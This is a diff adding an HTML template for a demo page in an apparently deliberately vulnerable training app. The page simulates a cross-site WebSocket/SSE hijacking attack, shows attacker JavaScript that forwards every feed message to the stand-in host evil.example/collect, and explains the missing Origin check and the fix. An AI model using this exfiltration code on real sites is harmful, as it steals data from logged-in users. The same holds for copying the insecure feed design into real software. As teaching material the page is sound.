@@ -1,0 +1,55 @@
+{% extends 'base.html' %}
+{% block title %}CSWSH Demo{% endblock %}
+{% block extra_head %}
+<link rel="stylesheet" href="{{ url_for('static', filename='css/aegis-v23.css') }}">
+{% endblock %}
+{% block content %}
+<div class="cswsh-banner">
+  <div class="cswsh-badge">SIMULATED ATTACKER PAGE — evil.example</div>
+  <p style="margin:0;font-size:13px;color:var(--danger);">This page simulates what an attacker's website can do when a victim visits it while authenticated to AEGIS Station. It connects to the station's unauthenticated WebSocket feed cross-origin and exfiltrates all data received.</p>
+</div>
+
+<div class="grid grid-2" style="gap:18px;">
+  <div class="ws-terminal">
+    <div class="ws-titlebar">
+      <div class="ws-dot connected"></div>
+      <span style="font-family:'JetBrains Mono',monospace;font-size:11px;color:rgba(255,255,255,.5);">evil.example → /ws/feed (victim's session)</span>
+    </div>
+    <div class="ws-feed" id="ws-feed">
+      <div class="ws-msg system"><span class="ws-ts">--:--:--</span><span class="ws-dir out">→</span><span class="ws-body">CSWSH: Connecting to victim's station feed…</span></div>
+    </div>
+    <div style="padding:8px 14px;border-top:1px solid rgba(79,216,224,.15);display:flex;gap:8px;">
+      <button id="ws-btn" class="btn small" onclick="connectWsFeed()">Launch Attack →</button>
+    </div>
+  </div>
+
+  <div style="display:flex;flex-direction:column;gap:14px;">
+    <div class="panel">
+      <h2 style="font-size:13px;margin-bottom:8px;">What the attacker's JS does</h2>
+      <pre class="code" style="font-size:11px;">// On evil.example — runs in victim's browser
+const src = new EventSource(
+  "https://aegis-station.local/ws/feed"
+);
+// Browser attaches victim's session cookie ↑
+src.onmessage = (e) => {
+  // Exfiltrate every message
+  fetch("https://evil.example/collect", {
+    method: "POST",
+    body:   e.data,
+  });
+};</pre>
+    </div>
+    <div class="panel">
+      <h2 style="font-size:13px;margin-bottom:8px;">Why it works</h2>
+      <div style="font-size:12px;color:var(--dim);line-height:1.7;">
+        <p>1. <strong style="color:var(--text);">No <code>Origin</code> check</strong> — the server never validates where the request comes from.</p>
+        <p>2. <strong style="color:var(--text);">Cookie-carrying</strong> — browsers automatically attach the victim's session cookie to same-site SSE connections.</p>
+        <p>3. <strong style="color:var(--text);">Wildcard CORS</strong> — <code>Access-Control-Allow-Origin: *</code> allows any domain to read the response.</p>
+      </div>
+      <div style="margin-top:10px;font-size:11px;color:var(--dim);font-family:'JetBrains Mono',monospace;">Fix: validate <code>Origin</code> header server-side; require session for stream access</div>
+    </div>
+  </div>
+</div>
+
+<script src="{{ url_for('static', filename='js/aegis-v23.js') }}"></script>
+{% endblock %}
